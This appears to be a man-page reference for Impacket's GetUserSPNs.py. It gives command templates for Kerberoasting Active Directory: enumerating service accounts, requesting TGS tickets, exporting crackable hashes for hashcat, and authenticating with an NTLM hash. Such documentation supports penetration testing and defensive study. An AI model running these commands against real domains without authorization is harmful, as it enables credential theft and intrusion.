# TLDR

**Enumerate SPN accounts**

```GetUserSPNs.py [domain]/[username]:[password] -dc-ip [dc_ip]```

**Request service tickets**

```GetUserSPNs.py [domain]/[username]:[password] -dc-ip [dc_ip] -request```

**Output for hashcat**

```GetUserSPNs.py [domain]/[username]:[password] -dc-ip [dc_ip] -request -outputfile [hashes.txt]```

**Using NTLM hash**

```GetUserSPNs.py [domain]/[username] -hashes :[ntlm_hash] -dc-ip [dc_ip]```

# SYNOPSIS

**GetUserSPNs.py** _domain_/_user_ [_options_]

# PARAMETERS

_DOMAIN/USER_
> Domain and username.

**-dc-ip** _IP_
> Domain controller IP.

**-request**
> Request TGS tickets.

**-hashes** _LMHASH:NTHASH_
> Use NTLM hashes.

**-outputfile** _FILE_
> Output file for hashes.

**--help**
> Display help information.

# DESCRIPTION

**GetUserSPNs.py** performs Kerberoasting attacks against Active Directory. It identifies service accounts with SPNs and requests service tickets containing crackable password hashes.

The tool queries AD for accounts with servicePrincipalName attributes, then requests TGS tickets. These tickets contain password material crackable offline.

GetUserSPNs.py is used in penetration testing for credential attacks.

# CAVEATS

**Authorized testing only.** Requires domain credentials. Results need offline cracking.

# HISTORY

GetUserSPNs.py is part of **Impacket**, implementing the Kerberoasting attack technique documented in Active Directory security research.

# SEE ALSO

[GetNPUsers.py](/man/GetNPUsers.py)(1), [getTGT.py](/man/getTGT.py)(1)
